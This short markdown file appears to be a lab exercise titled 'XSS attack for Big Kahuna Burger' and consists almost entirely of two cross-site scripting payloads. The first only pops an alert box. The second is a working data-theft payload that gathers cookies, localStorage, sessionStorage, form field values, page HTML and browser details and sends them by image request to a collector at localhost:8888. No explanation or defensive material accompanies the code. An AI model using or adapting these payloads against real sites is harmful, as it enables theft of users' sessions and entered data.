# XSS attack for Big Kahuna Burger

## Basic

```html
<img src="x" onerror="alert('haha pwned!')">
```

## Advanced with sending to `localhost:8888` and storing in `stolen_data.txt`

```html
<img src="x" onerror="var data={cookies:document.cookie||'No cookies (HttpOnly?)',url:window.location.href,title:document.title||'No title',localStorage:JSON.stringify(localStorage)||'No localStorage',sessionStorage:JSON.stringify(sessionStorage)||'No sessionStorage',html:document.documentElement.outerHTML.substring(0,500),forms:(function(){let formData=[];for(let form of document.forms){let fields={};for(let input of form.elements){if(input.name)fields[input.name]=input.value}formData.push(fields)}return JSON.stringify(formData)||'No forms'})(),userAgent:navigator.userAgent||'No userAgent',screen:`${window.screen.width}x${window.screen.height}`||'No screen info',language:navigator.language||'No language',referrer:document.referrer||'No referrer'};new Image().src='http://localhost:8888/index.php?'+Object.keys(data).map(key=>key+'='+encodeURIComponent(data[key])).join('&');">
```
